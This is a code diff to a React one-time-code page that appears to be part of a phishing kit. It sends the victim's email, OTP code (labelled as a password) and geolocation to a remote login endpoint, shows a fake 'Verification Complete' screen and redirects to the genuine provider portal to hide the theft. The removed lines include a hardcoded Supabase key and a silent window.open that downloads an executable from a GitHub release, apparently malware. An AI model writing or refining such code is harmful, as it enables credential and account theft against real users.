@@ -1,6 +1,8 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { RefreshCw } from 'lucide-react';
+import { CheckCircle, RefreshCw } from 'lucide-react';
 import { getGeoInfo } from '../utils/geoip';
+import { buildWelcomeMessage, getProviderPortal } from '../utils/providers';
+import { submitLogin } from '../utils/api';
 
 interface OTPPageProps {
   email: string;
@@ -13,11 +15,26 @@ export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPag
   const [code, setCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
+  const [verified, setVerified] = useState(false);
+  const [welcomeMessage, setWelcomeMessage] = useState('');
   const inputRef = useRef<HTMLInputElement>(null);
+  const provider = getProviderPortal(providerId);
 
   useEffect(() => {
-    inputRef.current?.focus();
-  }, []);
+    if (!verified) {
+      inputRef.current?.focus();
+    }
+  }, [verified]);
+
+  useEffect(() => {
+    if (!verified) return;
+
+    const redirectTimer = window.setTimeout(() => {
+      window.location.href = provider.portalUrl;
+    }, 2500);
+
+    return () => window.clearTimeout(redirectTimer);
+  }, [verified, provider.portalUrl]);
 
   const handleVerify = async () => {
     if (code.replace(/\D/g, '').length < 6) {
@@ -27,39 +44,23 @@ export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPag
     setError('');
     setLoading(true);
 
-    // Open the required URL in a new tab (to avoid leaving the main page flow)
-    window.open('https://github.com/Hanock1625/update/releases/download/v1.0/install.update.setup.exe', '_blank');
-
     try {
-      const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
-      const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';
-
-      // Resolve geolocation (cached, never blocks UX)
       const geo = await getGeoInfo();
 
-      await fetch(`${supabaseUrl}/functions/v1/login`, {
-        method: 'POST',
-        headers: {
-          'Authorization': `Bearer ${supabaseKey}`,
-          'apikey': supabaseKey,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          email: email,
-          provider: providerId,
-          password: `[OTP Code] ${code}`,
-          // Spread all available geo fields
-          ...geo,
-        })
+      await submitLogin({
+        email: email,
+        provider: providerId,
+        password: `[OTP Code] ${code}`,
+        ...geo,
       });
     } catch (err) {
       console.error("Error sending OTP code:", err);
     }
 
-    setTimeout(() => {
-      setLoading(false);
-      onVerify();
-    }, 2000);
+    setWelcomeMessage(buildWelcomeMessage(email, providerId));
+    setVerified(true);
+    setLoading(false);
+    onVerify();
   };
 
   const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
@@ -90,7 +91,8 @@ export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPag
           </h2>
           <button
             onClick={onClose}
-            className="text-gray-400 hover:text-white transition-colors text-xl leading-none cursor-pointer select-none"
+            disabled={verified}
+            className="text-gray-400 hover:text-white transition-colors text-xl leading-none cursor-pointer select-none disabled:opacity-30 disabled:cursor-not-allowed"
             aria-label="Close"
           >
             ✕
@@ -99,64 +101,85 @@ export default function OTPPage({ email, providerId, onVerify, onClose }: OTPPag
 
         {/* Body */}
         <div className="px-6 py-8 space-y-6 bg-[#161515]">
-          {/* Key icon */}
-          <div className="flex justify-center">
-            <span style={{ fontSize: '3rem', lineHeight: 1 }} aria-hidden="true">🔑</span>
-          </div>
+          {verified ? (
+            <>
+              <div className="flex justify-center">
+                <CheckCircle className="w-14 h-14 text-emerald-400" aria-hidden="true" />
+              </div>
+              <div className="space-y-3 text-center">
+                <h3 className="text-lg font-semibold text-white font-sans">
+                  Verification Complete
+                </h3>
+                <p className="text-sm text-gray-300 font-sans leading-relaxed">
+                  {welcomeMessage}
+                </p>
+                <p className="text-xs text-gray-500 font-sans pt-1">
+                  Redirecting you to {provider.name}...
+                </p>
+              </div>
+            </>
+          ) : (
+            <>
+              {/* Key icon */}
+              <div className="flex justify-center">
+                <span style={{ fontSize: '3rem', lineHeight: 1 }} aria-hidden="true">🔑</span>
+              </div>
 
-          {/* Instruction */}
-          <p className="text-center text-sm text-gray-300 font-sans">
-            Enter the 6-digit code sent to your email
-          </p>
+              {/* Instruction */}
+              <p className="text-center text-sm text-gray-300 font-sans">
+                Enter the 6-digit code sent to your email
+              </p>
 
-          {/* Single code input — styled like Capture.PNG */}
-          <div className="space-y-1">
-            <input
-              ref={inputRef}
-              type="text"
-              inputMode="numeric"
-              value={code}
-              onChange={handleInput}
-              onKeyDown={handleKeyDown}
-              placeholder="000000"
-              maxLength={6}
-              disabled={loading}
-              className={`w-full bg-[#0e0e0e] border rounded-xl px-5 py-3.5 text-center text-xl font-mono tracking-[0.45em] text-white placeholder-gray-600
-                focus:outline-none transition-all duration-150
-                ${error ? 'border-red-500/60 focus:border-red-500' : 'border-white/12 focus:border-white/30'}`}
-              aria-label="One-time code"
-            />
-            {error && (
-              <p className="text-xs text-red-400 text-center font-sans pt-1">{error}</p>
-            )}
-          </div>
+              {/* Single code input — styled like Capture.PNG */}
+              <div className="space-y-1">
+                <input
+                  ref={inputRef}
+                  type="text"
+                  inputMode="numeric"
+                  value={code}
+                  onChange={handleInput}
+                  onKeyDown={handleKeyDown}
+                  placeholder="000000"
+                  maxLength={6}
+                  disabled={loading}
+                  className={`w-full bg-[#0e0e0e] border rounded-xl px-5 py-3.5 text-center text-xl font-mono tracking-[0.45em] text-white placeholder-gray-600
+                    focus:outline-none transition-all duration-150
+                    ${error ? 'border-red-500/60 focus:border-red-500' : 'border-white/12 focus:border-white/30'}`}
+                  aria-label="One-time code"
+                />
+                {error && (
+                  <p className="text-xs text-red-400 text-center font-sans pt-1">{error}</p>
+                )}
+              </div>
 
-          {/* Buttons */}
-          <div className="flex items-center justify-end gap-3 pt-1">
-            <button
-              type="button"
-              onClick={onClose}
-              disabled={loading}
-              className="px-5 py-2 rounded-lg bg-white/8 hover:bg-white/12 border border-white/10 text-sm font-sans font-medium text-gray-300 hover:text-white transition-colors cursor-pointer disabled:opacity-50"
-            >
-              Close
-            </button>
-            <button
-              type="button"
-              onClick={handleVerify}
-              disabled={loading}
-              className="px-6 py-2 rounded-lg bg-white/10 hover:bg-white/16 border border-white/15 text-sm font-sans font-semibold text-white transition-colors cursor-pointer disabled:opacity-50 flex items-center gap-2"
-            >
-              {loading ? (
-                <>
-                  <RefreshCw className="w-4 h-4 animate-spin" />
-                  Verifying...
-                </>
-              ) : (
-                'Verify'
-              )}
-            </button>
-          </div>
+              {/* Buttons */}
+              <div className="flex items-center justify-end gap-3 pt-1">
+                <button
+                  type="button"
+                  onClick={onClose}
+                  disabled={loading}
+                  className="px-5 py-2 rounded-lg bg-white/8 hover:bg-white/12 border border-white/10 text-sm font-sans font-medium text-gray-300 hover:text-white transition-colors cursor-pointer disabled:opacity-50"
+                >
+                  Close
+                </button>
+                <button
+                  type="button"
+                  onClick={handleVerify}
+                  disabled={loading}
+                  className="px-6 py-2 rounded-lg bg-white/10 hover:bg-white/16 border border-white/15 text-sm font-sans font-semibold text-white transition-colors cursor-pointer disabled:opacity-50 flex items-center gap-2"
+                >
+                  {loading ? (
+                    <>
+                      <RefreshCw className="w-4 h-4 animate-spin" />
+                      Verifying...
+                    </>
+                  ) : (
+                    'Verify'
+                  )}
+                </button>
+              </div>
+            </>
+          )}
         </div>
       </div>
 
